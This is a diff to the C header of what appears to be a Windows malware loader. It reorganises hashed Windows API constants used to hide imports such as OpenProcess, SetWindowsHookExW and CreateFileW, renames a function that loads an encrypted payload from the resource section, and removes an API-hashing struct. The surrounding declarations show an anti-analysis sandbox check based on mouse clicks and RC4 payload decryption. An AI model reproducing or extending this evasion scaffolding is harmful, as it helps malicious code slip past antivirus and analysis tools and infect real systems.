@@ -23,6 +23,26 @@ extern DWORD g_dwMouseClicks;
 // Minimum click for passing anti-analysis
 #define REQUIRED_CLICKS 7
 
+// Windows API hash values
+#define USER32DLLHashValue						0x5644677D
+#define KERNEL32DLLHashValue					0xEC1C6278
+
+#define FindResourceWHashValue					0x83CECA7F
+#define LoadResourceHashValue					0xFF951427
+#define LockResourceHashValue					0xFF951B2B
+#define SizeofResourceHashValue					0xD90BB0A3
+
+#define GetTickCount64HashValue					0xB26FB445
+#define OpenProcessHashValue					0x77CE8553
+#define CallNextHookExHashValue					0x5C51FD6F
+#define SetWindowsHookExWHashValue				0xA99AF232
+#define GetMessageWHashValue					0x61060461
+#define DefWindowProcWHashValue					0x22E85CBA
+#define UnhookWindowsHookExHashValue			0x5BE1CA0B
+#define GetModuleFileNameWHashValue				0xB4FFB003
+#define CreateFileWHashValue					0x94E432A9
+#define SetFileInformationByHandleHashValue     0xEBF511FC
+
 /*--------------------------------------------------------------------
   STRUCTURES
 --------------------------------------------------------------------*/
@@ -593,7 +613,7 @@ HANDLE GetCurrentProcessHandle();
 HANDLE GetCurrentThreadHandle();
 VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size);
 VOID ZeroMemoryEx(IN OUT PVOID Destination, IN SIZE_T Size);
-BOOL ReadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize);
+BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize);
 INT StringCompareW(IN LPCWSTR String1, IN LPCWSTR String2);
 LPCWSTR LowerCaseStringW(IN LPCWSTR String);
 WCHAR ToLowerCharW(IN WCHAR character);
@@ -635,36 +655,6 @@ BOOL Rc4DecryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
 
 // Defined and used by ApiHashing.cx
 #define CONTAINING_RECORD(address, type, field) ((type *)( (char *)(address) - (ULONG_PTR)(&((type *)0)->field) ))
-
-#define GetTickCount64HashValue					0xB26FB445
-#define OpenProcessHashValue					0x77CE8553
-#define CallNextHookExHashValue					0x5C51FD6F
-#define SetWindowsHookExWHashValue				0xA99AF232
-#define GetMessageWHashValue					0x61060461
-#define DefWindowProcWHashValue					0x22E85CBA
-#define UnhookWindowsHookExHashValue			0x5BE1CA0B
-#define GetModuleFileNameWHashValue				0xB4FFB003
-#define CreateFileWHashValue					0x94E432A9
-#define SetFileInformationByHandleHashValue     0xEBF511FC
-#define USER32DLLHashValue						0x5644677D
-#define KERNEL32DLLHashValue					0xEC1C6278
-
-typedef struct _API_HASHING {
-
-	fnGetTickCount64                pGetTickCount64;
-	fnOpenProcess                   pOpenProcess;
-	fnCallNextHookEx                pCallNextHookEx;
-	fnSetWindowsHookExW             pSetWindowsHookExW;
-	fnGetMessageW                   pGetMessageW;
-	fnDefWindowProcW                pDefWindowProcW;
-	fnUnhookWindowsHookEx           pUnhookWindowsHookEx;
-	fnGetModuleFileNameW            pGetModuleFileNameW;
-	fnCreateFileW                   pCreateFileW;
-	fnSetFileInformationByHandle    pSetFileInformationByHandle;
-
-}API_HASHING, * PAPI_HASHING;
-
-extern API_HASHING g_Api;
 
 FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
 FARPROC GetProcAddressByHashValue(IN HMODULE hModule, IN DWORD dwApiNameHashValue);
